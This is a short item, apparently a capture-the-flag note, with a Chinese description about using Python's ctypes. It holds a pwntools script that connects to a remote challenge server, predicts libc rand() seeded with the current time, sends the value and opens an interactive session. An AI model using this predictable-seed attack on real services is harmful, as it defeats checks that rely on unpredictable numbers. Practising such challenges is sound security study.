item.title: ctypes
item.description: 用python中的库实现C from pwn import * from ctypes import * from pwnlib.util.packing import p64 p = remote('10.131.194.201',59746) LIBC = CDLL('libc.so.6') seed = LIBC.time(0) LIBC.srand(seed) x = LIBC.rand() payload = str(x).encode() p.sendline(payload) p.interactive()
